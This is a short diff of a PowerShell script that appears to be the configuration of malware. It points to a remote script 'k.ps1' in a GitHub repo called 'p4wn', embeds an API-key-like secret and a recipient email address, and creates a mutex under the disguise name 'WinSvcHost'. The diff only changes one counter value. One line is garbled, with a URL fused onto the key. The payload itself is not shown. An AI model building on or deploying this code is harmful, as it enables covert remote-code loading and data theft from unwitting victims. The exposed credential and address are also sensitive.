@@ -1,7 +1,7 @@
 $u='https://raw.githubusercontent.com/adriancorreagutierrez-stack/p4wn/main/k.ps1'
 $k='re_SC8bwXbU_3cyFBwPJsSnqbhUGK428oj44'https://github.com/adriancorreagutierrez-stack/p4wn/blob/main/k.ps1
 $t='adriancorreagutierrez@gmail.com'
-$m=1
+$m=5
 $n='WinSvcHost'
 
 $mx=New-Object System.Threading.Mutex($false,"Local\$n")
